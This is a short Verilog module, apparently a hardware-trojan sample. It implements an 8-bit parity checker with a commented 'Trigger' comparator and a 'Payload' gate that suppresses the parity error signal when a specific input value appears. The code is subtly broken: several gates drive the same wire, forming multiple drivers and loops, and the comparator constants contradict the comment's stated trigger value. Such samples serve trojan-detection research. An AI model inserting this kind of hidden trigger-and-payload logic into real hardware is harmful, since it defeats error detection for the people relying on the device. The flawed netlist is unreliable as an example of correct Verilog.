module top (
    input  [7:0] data_in,
    output       parity_error
);

    // Standard parity tree: XOR all data bits
    wire parity_tree_out;
    xor u_xor0 (parity_tree_out, data_in[0], data_in[1]);
    xor u_xor1 (parity_tree_out, parity_tree_out, data_in[2]);
    xor u_xor2 (parity_tree_out, parity_tree_out, data_in[3]);
    xor u_xor3 (parity_tree_out, parity_tree_out, data_in[4]);
    xor u_xor4 (parity_tree_out, parity_tree_out, data_in[5]);
    xor u_xor5 (parity_tree_out, parity_tree_out, data_in[6]);
    xor u_xor6 (parity_tree_out, parity_tree_out, data_in[7]);

    // Trigger: rare-value comparator on data_in == 8'b10101010
    wire trigger_match;
    wire [7:0] xnor_out;
    xnor u_xnor0 (xnor_out[0], data_in[0], 1'b1);
    xnor u_xnor1 (xnor_out[1], data_in[1], 1'b0);
    xnor u_xnor2 (xnor_out[2], data_in[2], 1'b1);
    xnor u_xnor3 (xnor_out[3], data_in[3], 1'b0);
    xnor u_xnor4 (xnor_out[4], data_in[4], 1'b1);
    xnor u_xnor5 (xnor_out[5], data_in[5], 1'b0);
    xnor u_xnor6 (xnor_out[6], data_in[6], 1'b1);
    xnor u_xnor7 (xnor_out[7], data_in[7], 1'b0);

    and u_and0 (trigger_match, xnor_out[0], xnor_out[1]);
    and u_and1 (trigger_match, trigger_match, xnor_out[2]);
    and u_and2 (trigger_match, trigger_match, xnor_out[3]);
    and u_and3 (trigger_match, trigger_match, xnor_out[4]);
    and u_and4 (trigger_match, trigger_match, xnor_out[5]);
    and u_and5 (trigger_match, trigger_match, xnor_out[6]);
    and u_and6 (trigger_match, trigger_match, xnor_out[7]);

    // Payload: AND gate that forces parity_error low when trigger is active
    wire trigger_match_n;
    not u_not_trigger (trigger_match_n, trigger_match);
    wire payload_and_out;
    and u_payload_and (payload_and_out, parity_tree_out, trigger_match_n);

    // Output assignment
    assign parity_error = payload_and_out;

endmodule